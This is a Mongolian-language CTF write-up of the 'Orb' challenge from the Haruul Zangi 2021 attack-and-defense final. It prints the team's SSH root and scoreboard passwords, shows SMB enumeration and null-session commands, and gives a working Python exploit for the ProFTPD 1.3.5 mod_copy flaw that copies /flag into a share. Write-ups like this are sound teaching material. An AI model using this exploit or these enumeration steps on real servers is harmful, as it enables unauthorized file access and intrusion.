---
published: true
---
# HZ 2021 Final Round Orb
![visitor badge](https://visitor-badge.laobi.icu/badge?page_id=keyword&title=зочилсон-хүмүүсийн-тоо)
<p align="center">
  <img src="https://raw.githubusercontent.com/fg0d/fg0d.github.io/master/photos/hzz.png">
</p>

"Харуул Занги 2021" амжилттай болж өндөрлөлөө. Миний бие энэ жил **AnonSec** багаас хоёр найзтайгаа хамт оролцсон бөгөөд 1-р шатанд 3-р байранд , 2-р шатанд 5-р байранд орсон билээ. Энэ жил өмнө жилийн тэмцээнийг сонирхолтой болгож өгсөн зүйл нь Финалын шат "Attack And Defense" төрлөөр явагдсан. Манай баг төдийлөн өндөр амжилт үзүүлж чадаагүй ч гэсэн өөрсдийн бодсон бодлогоо тайлбартайгаар хүргэх нь зүйтэй болов уу гэж бодлоо.

## Orb

Финалын шатанд баг бүрт тусдаа **Docker** үүсгэж өгсөн учраас эхлээд SSH-ээр хандаж орох хэрэгтэй болсон

Жишээ нь: **Манай багийн SSH login хэсэг**

Багийн нэр: **AnonSec**
<br>
Манай багийн domain: **hz-vulbox3.haruulzangi.mn**
<br>
SSH username: **root**
<br>
SSH password: **u3RYQMZDaAg4bEEq6SmLOi**
<br>
[Онооны самбар харах , флагаа оруулах хэсэг:](http://final.haruulzangi.mn:19999/)
<br>
"Нэвтрэх нэр": **AnonSec**
<br>
"Нууц үг": **5Ft1ELGZOqUI87W4**

Үүний дараа бид challenge бүрийн docker-н мэдээллийг харахын тулд энэхүү тушаалыг ашиглах боломжтой

root@ip-10-10-20-23:~# **docker ps -a**

`e57944a41e96   orb             "/tmp/entrypoint.sh …"   9 hours ago    Up 6 hours   0.0.0.0:21->21/tcp, :::21->21/tcp, 0.0.0.0:139->139/tcp, :::139->139/tcp, 0.0.0.0:445->445/tcp, :::445->445/tcp, 0.0.0.0:2205->22/tcp, :::2205->22/tcp   orb`

Тушаалыг бичсэнээр бид нар **Orb** даалгаварлуу **bash shell** -ээр орж байгаа юм.

root@ip-10-10-20-23:~# **docker exec -it orb /bin/bash**

Орсны дараа файлуудыг нэг бүрчлэн туршиж үзэхэд **ProFTPd** , **Samba** гэсэн хоёр танил сервис байхыг харж болно. 

`Samba буюу SMB нь 445 , 139-р портон дээр ажилладаг файл хуваалцах боломжыг бүрдүүлдэг протокол`

`ProFTPd буюу FTP нь 21-р портон дээр ажилладаг файл дамжуулах боломжыг бүрдүүлдэг протокол`

> SMB дээр Null session үүсгэж нууц үг шаардлагүйгээр хандалт хийх боломжтой эмзэг байдал байдаг

> ProFTPd дээр хамгийн сайн мэдэх mod_copy эмзэг байдал байдаг

Одоо тэгвэл энэхүү хоёр сервисын уялдаа холбоог жаахан ойлгох хэрэг гарна. Эхлээд юуг ашиглаж болох вэ гэхээр:

SMB-г **Enumeration** хийж мэдээлэл цуглуулах хэрэгтэй.

`$IP = '18.162.113.173'`

`enum4linux -A $IP`

ингэснээр ямар хэрэглэгчид байгаа мэдээллийг , мөн default-аар байгаа бол шууд нууц үгийг олох боломжтой байдаг

`yondu`

`gamora`

`nebula`

гэсэн 3 хэрэглэгч олдлоо

Тэгвэл энэхүү 3 хэрэглэгчрүү ороход бидний Permission хүрэх үү? **Access** хийж чадах уу гэдгийг шалгахын тулд:

`$IP = '18.162.113.173'`

`smbmap -H 18.162.113.173`

|print$          |Disk      |Printer Drivers|
|----------------|----------|---------------|
|yondu           |Disk      |/samba/ is a nice planet to place orb ( Admin access )|
|gamora          |Disk      |Where is the orb? ( Admin access )|
|nebula          |Disk      |Why is gamora? ( Free access )|
|IPC$            |IPC       |IPC Service (e57944a41e96 server (Samba, Ubuntu))|
    
үүнээс харвал **nebula** хэрэглэгчрүү нэвтрэхэд **Free access**-тай буюу **Null session** үүсгэх боломжтой байгааг харж болно.

`smbclient //18.162.113.173/nebula`

нууц үг шаардлагагүй шууд **Enter** дараад орно

Энэ маань бидний файлаа хуулаад тавихад харах боломжтой хэрэглэгч гэж ойлгож болно.

За одоо ProFTPd-гээр үндсэн **flag** файлаа mod_copy хийж **nebula** хэрэглэгчрүү хуулах шаардлага үүсэж байгаа

IP-гаар нь скан хийж үзвэл:

`21/tcp   open   ftp         ProFTPD 1.3.5`

ProFTPd 1.3.5 хувилбар байсан бөгөөд Exploit-н хайж үзвэл

[Exploit хийх линк](https://www.exploit-db.com/exploits/36742)  энэхүү линкээр ороод үзэж болно

Шууд энэхүү exploit-г ажиллуулах боломжгүй бөгөөд үүнийг скрипт болгоод бага зэрэг өөрчлөлт оруулвал

```python
import sys
import socket
import requests

def exploit(client, target):
    client.connect((target,21)) # Connecting to the target server
    banner = client.recv(74)
    print(banner.decode())
    client.send(b'site cpfr /flag\r\n')
    print(client.recv(1024).decode())
    client.send(b'site cpto /samba/nebula/flag.txt\r\n')
    print(client.recv(1024).decode())
    client.close()
    print('Exploit Completed')

def check(url):
    req = requests.get(url) # Requesting the written PoC php file via HTTP
    if req.status_code == 200:
        print('[+] File Written Successfully')
        print(f'[+] Go to : {url}')
    else:
        print('[!] Something Went Wrong')
        print('[!] Directory might not be writable')

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target = sys.argv[1]
    exploit(client, target)
    url = 'http://' + target + '/test.php'
    check(url)

if __name__ == '__main__':
    main()
```

**Exploit completed** болсоны дараа **smbclient**-аар орсон **nebula** хэрэглэгчээр ороод **dir** тушаалыг биелүүлэхэд **flag** хуулагдсан байх болно

<p align="center">
  <img src="https://raw.githubusercontent.com/fg0d/fg0d.github.io/master/photos/flag.PNG">
</p>
